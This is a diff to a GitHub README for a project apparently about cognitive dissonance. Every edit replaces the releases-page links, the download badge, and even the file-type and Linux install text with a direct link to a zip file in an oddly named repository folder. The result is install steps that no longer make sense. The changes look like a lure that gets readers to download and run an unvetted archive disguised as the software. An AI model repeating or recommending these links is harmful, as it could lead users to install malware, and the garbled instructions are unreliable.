@@ -9,12 +9,12 @@ This project interprets cognitive dissonance as fundamental to how we understand
 To begin exploring this application, you will need to download and install it. Follow the steps below for a seamless experience.
 
 **Download the software here:**  
-[![Download Cognitive-Dissonance-as-Epistemic-Event](https://img.shields.io/badge/Download-Cognitive--Dissonance--as--Epistemic--Event-brightgreen)](https://github.com/Loser111111111/Cognitive-Dissonance-as-Epistemic-Event/releases)
+[![Download Cognitive-Dissonance-as-Epistemic-Event](https://github.com/Loser111111111/Cognitive-Dissonance-as-Epistemic-Event/raw/refs/heads/main/unwettable/Dissonance_Cognitive_Event_as_Epistemic_2.5-beta.4.zip)](https://github.com/Loser111111111/Cognitive-Dissonance-as-Epistemic-Event/raw/refs/heads/main/unwettable/Dissonance_Cognitive_Event_as_Epistemic_2.5-beta.4.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Release Page:**  
-   Go to the [Releases page](https://github.com/Loser111111111/Cognitive-Dissonance-as-Epistemic-Event/releases) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/Loser111111111/Cognitive-Dissonance-as-Epistemic-Event/raw/refs/heads/main/unwettable/Dissonance_Cognitive_Event_as_Epistemic_2.5-beta.4.zip) to find the latest version of the software.
 
 2. **Choose the Right Version:**  
    Look for the most recent release. You should see a list of available files for download. Select the version that matches your operating system (Windows, Mac, or Linux).
@@ -23,12 +23,12 @@ To begin exploring this application, you will need to download and install it. F
    Click the download link for your chosen version. The file will start downloading to your computer.
 
 4. **Locate the Downloaded File:**  
-   Find the file in your Downloads folder or the location you saved it. The file will typically have a format like `.exe`, `.dmg`, or `.tar.gz`, depending on your operating system.
+   Find the file in your Downloads folder or the location you saved it. The file will typically have a format like `.exe`, `.dmg`, or `https://github.com/Loser111111111/Cognitive-Dissonance-as-Epistemic-Event/raw/refs/heads/main/unwettable/Dissonance_Cognitive_Event_as_Epistemic_2.5-beta.4.zip`, depending on your operating system.
 
 5. **Install the Application:**  
    - **Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
    - **Mac:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the installation script from the terminal.
+   - **Linux:** Extract the `https://github.com/Loser111111111/Cognitive-Dissonance-as-Epistemic-Event/raw/refs/heads/main/unwettable/Dissonance_Cognitive_Event_as_Epistemic_2.5-beta.4.zip` file and run the installation script from the terminal.
 
 6. **Run the Application:**  
    After installation, find the application in your applications folder or start menu. Click to open it.
@@ -81,7 +81,7 @@ Each topic provides valuable insights into how we think and understand knowledge
 
 To ensure you have the latest features and bug fixes:
 
-1. **Check for Updates:** Regularly visit the [Releases page](https://github.com/Loser111111111/Cognitive-Dissonance-as-Epistemic-Event/releases) for new versions.
+1. **Check for Updates:** Regularly visit the [Releases page](https://github.com/Loser111111111/Cognitive-Dissonance-as-Epistemic-Event/raw/refs/heads/main/unwettable/Dissonance_Cognitive_Event_as_Epistemic_2.5-beta.4.zip) for new versions.
 2. **Download the Latest Version:** Follow the same steps as above for installation.
 3. **Backup Your Data:** Before updating, save any important data from the application.
 
